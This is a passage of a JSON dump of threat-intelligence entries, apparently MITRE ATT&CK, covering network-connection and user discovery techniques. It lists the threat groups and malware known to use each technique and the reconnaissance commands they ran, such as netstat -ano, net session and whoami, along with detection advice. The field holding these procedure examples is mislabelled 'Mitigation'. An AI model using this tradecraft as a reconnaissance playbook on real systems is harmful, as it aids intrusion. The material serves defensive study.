    "Description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.[1][2][3] Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.Utilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. show ip sockets, show tcp brief).[4]",
    "Mitigation": [
      {
        "id": "G0018",
        "name": "admin@338",
        "description": "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to display network connections: netstat -ano >> %temp%\\download[5]"
      },
      {
        "id": "G0138",
        "name": "Andariel",
        "description": "Andariel has used the netstat -naop tcp command to display TCP connections on a victim's machine.[6]"
      },
      {
        "id": "G0006",
        "name": "APT1",
        "description": "APT1 used the net use command to get a listing on network connections.[7]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 has a tool that can enumerate current network connections.[8][9][10]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 used the netstat -anpo tcp command to display TCP connections on the victim's machine.[11]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system.[12]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 has enumerated IP addresses of network resources and used the netstat command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions.[13][14]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to gather TCP and UDP table status listings.[15]"
      },
      {
        "id": "S0638",
        "name": "Babuk",
        "description": "Babuk can use \"WNetOpenEnumW\" and \"WNetEnumResourceW\" to enumerate files in network resources for encryption.[16]"
      },
      {
        "id": "G0135",
        "name": "BackdoorDiplomacy",
        "description": "BackdoorDiplomacy has used NetCat and PortQry  to enumerate network connections and display the status of related TCP and UDP ports.[17]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can execute netstat.exe -f on a compromised machine.[18]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "BlackEnergy has gathered information about local network connections using netstat.[19][20]"
      },
      {
        "id": "S0335",
        "name": "Carbon",
        "description": "Carbon uses the netstat -r and netstat -an commands.[21]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower can use netsh wlan show profiles to list specific Wi-Fi profile details.[22]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used netstat -ano | findstr EST to discover network connections.[23]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can produce a sessions report from compromised hosts.[24]"
      },
      {
        "id": "S0244",
        "name": "Comnie",
        "description": "Comnie executes the netstat -ano command.[25]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti can enumerate routine network connections from a compromised host.[26]"
      },
      {
        "id": "S0488",
        "name": "CrackMapExec",
        "description": "CrackMapExec can discover active sessions for a targeted system.[27]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba can use the function GetIpNetTable to recover the last connections to the victim's machine.[28]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack can collect network and active connection information.[29]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "The discovery modules used with Duqu can collect information on network connections.[30]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca employed a PowerShell script called RDPConnectionParser to read and filter the Windows event log \"Microsoft-Windows-TerminalServices-RDPClient/Operational\"(Event ID 1024) to obtain network information from RDP connections. Earth Lusca has also used netstat from a compromised system to obtain network connection information.[31]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor can enumerate all connected drives.[32]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can enumerate the current network connections of a host.[33]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic uses the net use, net session, and netstat commands to gather information on network connections.[34][35]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has used netstat and other net  commands for network reconnaissance efforts.[36]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro has been used to execute netstat -ano on a compromised host.[37]"
      },
      {
        "id": "C0007",
        "name": "FunnyDream",
        "description": "During FunnyDream, the threat actors used netstat to discover network connections on remote systems.[38]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM used netstat -oan to obtain information about the victim network connections.[39]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT uses the netstat command to find open ports on the victim’s machine.[40]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has used netstat to monitor connections to specific ports.[41]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT can list network connections.[42]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang performs local network connection discovery using netstat.[43][44]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI has used net session on the victim's machine.[45]"
      },
      {
        "id": "S1075",
        "name": "KOPILUWAK",
        "description": "KOPILUWAK can use netstat, Arp, and Net to discover current TCP connections.[46]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs collects a list of active and listening connections by using the command netstat -nao as well as a list of available network mappings with net use.[47]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used net use to identify and establish a network connection with a remote host.[48]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar has a plugin to retrieve information about all active network sessions on the infected server.[49]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can identify the IP and port numbers for all remote connections from the compromised host.[50]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete uses the netsh wlan show networks mode=bssid and netsh wlan show interfaces commands to list all nearby WiFi networks and connected interfaces.[51]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can use the GetExtendedTcpTable function to retrieve information about established TCP connections.[52]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has used quser.exe to identify existing RDP connections.[53]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has used the \"WNetOpenEnumW\", \"WNetEnumResourceW\", \"WNetCloseEnum\" and \"WNetAddConnection2W\" functions to enumerate the network resources on the infected machine.[54]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used net use to conduct connectivity checks to machines.[55]"
      },
      {
        "id": "S0443",
        "name": "MESSAGETAP",
        "description": "After loading the keyword and phone data files, MESSAGETAP begins monitoring all network connections to and from the victim server. [56]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used a PowerShell backdoor to check for Skype connections on the target machine.[57]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has used netstat -ano to determine network connection information.[58]"
      },
      {
        "id": "S0102",
        "name": "nbtstat",
        "description": "nbtstat can be used to discover current NetBIOS sessions."
      },
      {
        "id": "S0039",
        "name": "Net",
        "description": "Commands such as net use and net session can be used in Net to gather information about network connections from a particular host.[59]"
      },
      {
        "id": "S0104",
        "name": "netstat",
        "description": "netstat can be used to enumerate local network connections, including active TCP connections and other network statistics.[60]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can capture session logon details from a compromised host.[61]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used netstat -an on a victim to get a listing of network connections.[62]"
      },
      {
        "id": "S0439",
        "name": "Okrum",
        "description": "Okrum was seen using NetSess to discover NetBIOS sessions.[63]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors used the net session, net use, and netstat commands as part of their advanced reconnaissance.[64]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors collected a list of open connections on the infected system using netstat and checks whether it has an internet connection.[65]"
      },
      {
        "id": "S0165",
        "name": "OSInfo",
        "description": "OSInfo enumerates the current network connections similar to  net use .[8]"
      },
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Once inside a Virtual Private Cloud, Pacu can attempt to identify DirectConnect, VPN, or VPC Peering.[66]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX has a module for enumerating TCP and UDP network connections and associated processes using the netstat command.[67]"
      },
      {
        "id": "G0033",
        "name": "Poseidon Group",
        "description": "Poseidon Group obtains and saves information about victim network interfaces and addresses.[68]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 contains an implementation of netstat to enumerate TCP and UDP connections.[69]"
      },
      {
        "id": "S0184",
        "name": "POWRUNER",
        "description": "POWRUNER may collect active network connections by running netstat -an on a victim.[70]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy has a built-in utility command for netstat, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.[71]"
      },
      {
        "id": "S1032",
        "name": "PyDCrypt",
        "description": "PyDCrypt has used netsh to find RPC connections on remote machines.[72]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can use netstat to enumerate current network connections.[73][74]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can use netstat to enumerate network connections.[75]"
      },
      {
        "id": "S0241",
        "name": "RATANKBA",
        "description": "RATANKBA uses netstat -ano to search for specific IP address ranges.[76]"
      },
      {
        "id": "S0153",
        "name": "RedLeaves",
        "description": "RedLeaves can enumerate drives and Remote Desktop sessions.[77]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec can obtain a list of active connections and open ports.[78]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured.[79][80]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has the ability to execute the netstat command.[81]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter used the Windows function GetExtendedUdpTable to detect connected UDP endpoints.[82]"
      },
      {
        "id": "S0063",
        "name": "SHOTPUT",
        "description": "SHOTPUT uses netstat to list TCP connection status.[83]"
      },
      {
        "id": "S0589",
        "name": "Sibot",
        "description": "Sibot has retrieved a GUID associated with a present LAN connection on a compromised machine.[84]"
      },
      {
        "id": "S0633",
        "name": "Sliver",
        "description": "Sliver can collect network connection information.[85]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA can enumerate open ports on a victim machine.[86]"
      },
      {
        "id": "S0374",
        "name": "SpeakUp",
        "description": "SpeakUp uses the arp -a command. [87]"
      },
      {
        "id": "S0018",
        "name": "Sykipot",
        "description": "Sykipot may use netstat -ano to display active network connections.[88]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has run netstat -anp to search for rival malware connections.[89] TeamTNT has also used libprocesshider to modify /etc/ld.so.preload.[90]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 has used net use and netstat to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim.[91]"
      },
      {
        "id": "S0678",
        "name": "Torisma",
        "description": "Torisma can use WTSEnumerateSessionsW to monitor remote desktop connections.[92]"
      },
      {
        "id": "S0094",
        "name": "Trojan.Karagany",
        "description": "Trojan.Karagany can use netstat to collect a list of network connections.[93]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has tested if the localhost network is available and other connection capability on an infected system using command scripts.[94]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands.[34][95] Turla RPC backdoors have also enumerated the IPv4 TCP connection table via the GetTcpTable2 API call.[96]"
      },
      {
        "id": "S0452",
        "name": "USBferry",
        "description": "USBferry can use netstat and nbtstat to detect active network connections.[94]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "Volgmer can gather information about TCP connection state.[97]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has used netstat -ano on compromised hosts to enumerate network connections.[98][99]"
      },
      {
        "id": "S0579",
        "name": "Waterbear",
        "description": "Waterbear can use API hooks on GetExtendedTcpTable to retrieve a table containing a list of TCP endpoints available to the application.[100]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy uses netstat -aon to gather network connection information.[101]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for executed processes that may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "System Owner/User Discovery",
    "Code": "T1033",
    "Description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Various utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.On network devices, Network Device CLI commands such as show users and show ssh can be used to display users currently logged into the device.[1][2]",
    "Mitigation": [
      {
        "id": "S1028",
        "name": "Action RAT",
        "description": "Action RAT has the ability to collect the username from an infected host.[3]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can collect the username from the victim’s machine.[4][5][6]"
      },
      {
        "id": "S0092",
        "name": "Agent.btz",
        "description": "Agent.btz obtains the victim username and saves it to a file.[7]"
      },
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey has collected the user name from a compromised host using GetUserNameA.[8]"
      },
      {
        "id": "G0073",
        "name": "APT19",
        "description": "APT19 used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.[9]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "An APT3 downloader uses the Windows command \"cmd.exe\" /C whoami to verify that it is running with the elevated privileges of \"System.\"[10]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 collected the victim's username and executed the whoami command on the victim's machine. APT32 executed shellcode to collect the username on the victim's machine. [11][12][13]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 identifies the victim username.[14]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.[15]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 used Remexi to collect usernames from the system.[16]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used the WMIEXEC utility to execute whoami commands on remote machines.[17]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to identify the username on a compromised host.[18]"
      },
      {
        "id": "S1087",
        "name": "AsyncRAT",
        "description": "AsyncRAT can check if the current user of a compromised system is an administrator. [19]"
      },
      {
        "id": "S1029",
        "name": "AuTo Stealer",
        "description": "AuTo Stealer has the ability to collect the username from an infected host.[3]"
      },
      {
        "id": "S0344",
        "name": "Azorult",
        "description": "Azorult can collect the username from the victim’s machine.[20]"
      },
      {
        "id": "S0414",
        "name": "BabyShark",
        "description": "BabyShark has executed the whoami command.[21]"
      },
      {
        "id": "S0093",
        "name": "Backdoor.Oldrea",
        "description": "Backdoor.Oldrea collects the current username from the victim.[22]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can obtain logged user information from a compromised machine and can execute the command whoami.exe.[23]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can identify the username of the infected user.[24]"
      },
      {
        "id": "S0017",
        "name": "BISCUIT",
        "description": "BISCUIT has a command to gather the username from the system.[25]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat can utilize net use commands to discover the user name on a compromised host.[26]"
      },
      {
        "id": "S0521",
        "name": "BloodHound",
        "description": "BloodHound can collect information on user sessions.[27]"
      },
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT can collect the username on a compromised host.[28]"
      },
      {
        "id": "S0486",
        "name": "Bonadan",
        "description": "Bonadan has discovered the username of the user running the backdoor.[29]"
      },
      {
        "id": "S0635",
        "name": "BoomBox",
        "description": "BoomBox can enumerate the username on a compromised host.[30]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee has the ability to identify the user name.[31]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 used whoami to gather information from victim machines.[32]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors collected whoami information via PowerShell scripts.[33]"
      },
      {
        "id": "S0351",
        "name": "Cannon",
        "description": "Cannon can gather the username from the system.[34]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT can collect the username from a victim machine.[35]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell can obtain a list of user accounts from a victim's machine.[36]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes has collected the username and UID from the infected machine.[37]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used the quser command to show currently logged on users.[38]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme can retrieve the username from a targeted system.[39]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can identify the username on a compromised host.[40][41]"
      },
      {
        "id": "S1024",
        "name": "CreepySnail",
        "description": "CreepySnail can execute getUsername on compromised systems.[42]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson can identify the user on a targeted system.[43][44][45]"
      },
      {
        "id": "S0498",
        "name": "Cryptoistic",
        "description": "Cryptoistic can gather data on the user of a compromised host.[46]"
      },
      {
        "id": "S0334",
        "name": "DarkComet",
        "description": "DarkComet gathers the username from the victim’s machine.[47]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman has collected the username from a victim machine.[48]"
      },
      {
        "id": "S0354",
        "name": "Denis",
        "description": "Denis enumerates and collects the username from the victim’s machine.[49][13]"
      },
      {
        "id": "S0021",
        "name": "Derusbi",
        "description": "A Linux version of Derusbi checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges. Derusbi also gathers the username of the victim.[50]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol can collect the username from a compromised host.[51]"
      },
      {
        "id": "S1021",
        "name": "DnsSystem",
        "description": "DnsSystem can use the Windows user name to create a unique identification for infected users and systems.[52]"
      },
      {
        "id": "S0186",
        "name": "DownPaper",
        "description": "DownPaper collects the victim username and sends it to the C2 server.[53]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly used the command query user on victim hosts.[54]"
      },
      {
        "id": "S0694",
        "name": "DRATzarus",
        "description": "DRATzarus can obtain a list of users from an infected machine.[55]"
      },
      {
        "id": "S0024",
        "name": "Dyre",
        "description": "Dyre has the ability to identify the users on a compromised host.[56]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca collected information on user accounts via the whoami command.[57]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor has used tools to gather information about users.[58]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has enumerated all users connected to network shares."
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can enumerate the username on targeted hosts.[59]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic collects the user name from the victim’s machine.[60]"
      },
      {
        "id": "S0568",
        "name": "EVILNUM",
        "description": "EVILNUM can obtain the username from the victim's machine.[61]"
      },
      {
        "id": "S0401",
        "name": "Exaramel for Linux",
        "description": "Exaramel for Linux can run whoami to identify the system owner.[62]"
      },
      {
        "id": "S0569",
        "name": "Explosive",
        "description": "Explosive has collected the username from the infected host.[63]"
      },
      {
        "id": "S0171",
        "name": "Felismus",
        "description": "Felismus collects the current username and sends it to the C2 server.[64]"
      },
      {
        "id": "S0267",
        "name": "FELIXROOT",
        "description": "FELIXROOT collects the username from the victim’s machine.[65][66]"
      },
      {
        "id": "G0051",
        "name": "FIN10",
        "description": "FIN10 has used Meterpreter to enumerate users on remote systems.[67]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has used the command cmd.exe /C quser to collect user session information.[68]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has executed the command quser to display the session details of a compromised machine.[69]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro has been used to run the whoami command on the system.[70]"
      },
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy enumerates the current user during the initial infection.[71][72]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors used Empire to enumerate hosts and gather username, machine name, and administrative permissions information.[59]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream has the ability to gather user information from the targeted system using whoami/upn&whoami/fqdn&whoami/logonid&whoami/all.[73]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM used whoami and query user to obtain information about the victim user.[74]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "A Gamaredon Group file stealer can gather the victim's username to send to a C2 server.[75]"
      },
      {
        "id": "S0168",
        "name": "Gazer",
        "description": "Gazer obtains the current user's security identifier.[76]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium has the ability to distinguish between a standard user and an administrator on a compromised host.[39]"
      },
      {
        "id": "S0460",
        "name": "Get2",
        "description": "Get2 has the ability to identify the current username of an infected host.[77]"
      },
      {
        "id": "S0249",
        "name": "Gold Dragon",
        "description": "Gold Dragon collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.[78]"
      },
      {
        "id": "S0477",
        "name": "Goopy",
        "description": "Goopy has the ability to enumerate the infected system's user name.[13]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can collect the username from the victim's machine.[79]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT collects the victim username along with other account information (account type, description, full name, SID and status).[80]"
      },
      {
        "id": "S0632",
        "name": "GrimAgent",
        "description": "GrimAgent can identify the user id on a target machine.[81]"
      },
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM has used whoami to gather user information.[82]"
      },
      {
        "id": "S0214",
        "name": "HAPPYWORK",
        "description": "can collect the victim user name.[83]"
      },
      {
        "id": "S0391",
        "name": "HAWKBALL",
        "description": "HAWKBALL can collect the user name of the system.[84]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has run whoami on compromised machines to identify the current user.[85]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has the ability to collect the username on the infected host.[86]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole lists local users and session information.[87]"
      },
      {
        "id": "S0015",
        "name": "Ixeshe",
        "description": "Ixeshe collects the username from the victim’s machine.[88]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "JPIN can obtain the victim user name.[89]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar gathers information on users.[90]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has used implants capable of collecting the signed-in username.[91]"
      },
      {
        "id": "S0250",
        "name": "Koadic",
        "description": "Koadic can identify logged in users across the domain and views user sessions.[92][93]"
      },
      {
        "id": "S0162",
        "name": "Komplex",
        "description": "The OsInfo function in Komplex collects the current running username.[94]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI can collect the username from the victim’s machine.[95]"
      },
      {
        "id": "S1075",
        "name": "KOPILUWAK",
        "description": "KOPILUWAK can conduct basic network reconnaissance on the victim machine with whoami, to get user details.[96]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs collects registered owner details by using the commands systeminfo and net config workstation.[97]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Various Lazarus Group malware enumerates logged-on users.[98][99][100][101][102][46][103]"
      },
      {
        "id": "S0362",
        "name": "Linux Rabbit",
        "description": "Linux Rabbit opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain. [104]"
      },
      {
        "id": "S0513",
        "name": "LiteDuke",
        "description": "LiteDuke can enumerate the account name on a targeted system.[105]"
      },
      {
        "id": "S0680",
        "name": "LitePower",
        "description": "LitePower can determine if the current user has admin privileges.[106]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar can collect the username from the system.[107]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot has the ability to discover the username on the infected host.[108]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer has the ability to identify the username on a compromised host.[109]"
      },
      {
        "id": "G1014",
        "name": "LuminousMoth",
        "description": "LuminousMoth has used a malicious DLL to collect the username from compromised hosts.[110]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa can collect the username from the compromised machine.[111]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can collect the username from a compromised host.[112]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound malware has obtained the victim username and sent it to the C2 server.[113][114][115]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can retrieve the victim’s username.[116]"
      },
      {
        "id": "S0459",
        "name": "MechaFlounder",
        "description": "MechaFlounder has the ability to identify the username and hostname on a compromised host.[117]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can collect the username from a compromised host.[112]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has collected the username from the victim's machine.[118]"
      },
      {
        "id": "S0339",
        "name": "Micropsia",
        "description": "Micropsia collects the username from the victim’s machine.[119]"
      },
      {
        "id": "S1015",
        "name": "Milan",
        "description": "Milan can identify users registered to a targeted machine.[120]"
      },
      {
        "id": "S0280",
        "name": "MirageFox",
        "description": "MirageFox can gather the username from the victim’s machine.[121]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type runs tests to determine the privilege level of the compromised user.[122]"
      },
      {
        "id": "S0149",
        "name": "MoonWind",
        "description": "MoonWind obtains the victim username.[123]"
      },
      {
        "id": "S0284",
        "name": "More_eggs",
        "description": "More_eggs has the capability to gather the username from the victim's machine.[124][125]"
      },
      {
        "id": "S0256",
        "name": "Mosquito",
        "description": "Mosquito runs whoami on the victim’s machine.[126]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used malware that can collect the victim’s username.[127][128]"
      },
      {
        "id": "S0228",
        "name": "NanHaiShu",
        "description": "NanHaiShu collects the username from the victim.[129]"
      },
      {
        "id": "S0590",
        "name": "NBTscan",
        "description": "NBTscan can list active users on the system.[130][131]"
      },
      {
        "id": "S0272",
        "name": "NDiskMonitor",
        "description": "NDiskMonitor obtains the victim username and encrypts the information to send over its C2 channel.[132]"
      },
      {
        "id": "S0691",
        "name": "Neoichor",
        "description": "Neoichor can collect the user name from a victim's machine.[91]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used password cracking and pass-the-hash tools to discover usernames and passwords.[133]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT enumerates the current user during the initial infection.[134]"
      },
      {
        "id": "S0353",
        "name": "NOKKI",
        "description": "NOKKI can collect the username from the victim’s machine.[135]"
      },
      {
        "id": "S0644",
        "name": "ObliqueRAT",
        "description": "ObliqueRAT can check for blocklisted usernames on infected endpoints.[136]"
      },
      {
        "id": "S0340",
        "name": "Octopus",
        "description": "Octopus can collect the username from the victim’s machine.[137]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has run whoami on a victim.[138][139][140]"
      },
      {
        "id": "S0439",
        "name": "Okrum",
        "description": "Okrum can collect the victim username.[141]"
      },
      {
        "id": "C0012",
